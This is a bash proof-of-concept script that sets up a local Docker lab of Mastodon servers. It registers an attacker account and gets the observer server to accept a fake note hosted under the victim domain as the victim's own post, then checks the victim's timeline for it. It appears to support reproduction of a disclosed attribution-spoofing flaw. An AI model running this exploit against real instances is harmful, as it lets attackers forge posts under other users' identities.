#!/bin/bash

set -o pipefail

COMPOSE="${COMPOSE:-docker-compose}"

victim='https://victim.poc.example/objects/@victim.jsonld'
victim_note='https://victim.poc.example/objects/@victim/notes/1.jsonld'
fake_attr_note='https://victim.poc.example/user-contents/attacker/fake-attribution-note.jsonld'

cd "$(dirname "$0")" || exit 1

curlk() {
	curl -q -K ../assets/curlrc "$@"
}

main() {
	$COMPOSE run observer bundle exec rails db:setup &&
	$COMPOSE up -d &&

	echo 'Pinging the server until it starts up…' >&2 &&
	curlk -fISso /dev/null --retry 10 'https://observer.poc.example/health' &&

	{
		local client_id client_secret
		echo 'Setting up a Mastodon API client…' >&2
		read -r client_id &&
		read -r client_secret
	} < <(
		curlk -fSsX POST \
			-F 'client_name=DTFVuln-PoC' \
			-F 'redirect_uris=urn:ietf:wg:oauth:2.0:oob' \
			-F 'scopes=read write' \
			-F 'website=https://attacker.poc.example/' \
			'https://observer.poc.example/api/v1/apps' \
		| python3 -c $'import json\nimport sys\napp = json.load(sys.stdin)\nprint(app["client_id"])\nprint(app["client_secret"])'
	) &&

	local client_token="$(
		curlk -fSsX POST \
			-F "client_id=$client_id" \
			-F "client_secret=$client_secret" \
			-F 'redirect_uri=urn:ietf:wg:oauth:2.0:oob' \
			-F 'scope=read write' \
			-F 'grant_type=client_credentials' \
			'https://observer.poc.example/oauth/token' \
		| python3 -c $'import json\nimport sys\nprint(json.load(sys.stdin)["access_token"])'
	)" &&

	echo 'Setting up a Mastodon account for a supposed attacker…' >&2 &&
	local user_token="$(
		curlk -fSsX POST --oauth2-bearer "$client_token" \
			-F 'username=attacker' \
			-F 'email=me@attacker.poc.example' \
			-F 'password=password' \
			-F 'agreement=true' \
			-F 'locale=en' \
			'https://observer.poc.example/api/v1/accounts' \
		| python3 -c $'import json\nimport sys\nprint(json.load(sys.stdin)["access_token"])'
	)" && 

	$COMPOSE exec observer tootctl accounts modify attacker --email me@attacker.poc.example --confirm \
	|| return 1

	echo "Legitimate actor: <$victim>" >&2
	echo -n 'Checking the content type… ' >&2
	# `curl -I` would pipe ANSI escape sequnces if the `--no-styled-output` option weren't given.
	curlk -fISs --no-styled-output "$victim" | grep -i '^content-type:' >&2
	echo 'Looking up via Mastodon…' >&2
	local victim_json="$(
		curlk --fail-with-body -Ss --oauth2-bearer "$user_token" \
			"https://observer.poc.example/api/v2/search?q=$victim&type=accounts&resolve=true"
	)"
	local status=$?
	printf '%s\n' "$victim_json"
	if [ "$status" = 0 ]; then
		local victim_id="$(python3 -c $'import json\nimport sys\nprint(json.loads(sys.argv[1])["accounts"][0]["id"])' "$victim_json" 2> /dev/null)"
	fi

	echo >&2

	echo "Legitimate note: <$victim_note>" >&2
	echo -n 'Checking the content type… ' >&2
	curlk -fISs --no-styled-output "$victim_note" | grep -i '^content-type:' >&2
	echo 'Looking up via Mastodon…' >&2
	curlk --fail-with-body -Ss --oauth2-bearer "$user_token" \
		"https://observer.poc.example/api/v2/search?q=$victim_note&type=statuses&resolve=true"
	echo

	echo >&2

	echo "Fake note: <$fake_attr_note>" >&2
	echo -n 'Checking the content type… ' >&2
	curlk -fISs --no-styled-output "$fake_attr_note" | grep -i '^content-type:' >&2
	echo 'Looking up via Mastodon…' >&2
	curlk --fail-with-body -Ss --oauth2-bearer "$user_token" \
		"https://observer.poc.example/api/v2/search?q=$fake_attr_note&type=statuses&resolve=true"
	echo

	echo >&2

	if [ -n "$victim_id" ]; then
		echo 'Getting the user timeline of the legitimate actor via Mastodon…' >&2
		curlk --fail-with-body -Ss "https://observer.poc.example/api/v1/accounts/$victim_id/statuses"
		echo
		echo 'The timeline should contain the fake note if the attack was successful.' >&2
		echo >&2
	fi
}

main
status=$?

echo 'The containers are kept running so that you can manually play with them.' >&2
echo 'Run `'"$COMPOSE stop"'` to stop them.' >&2

exit "$status"
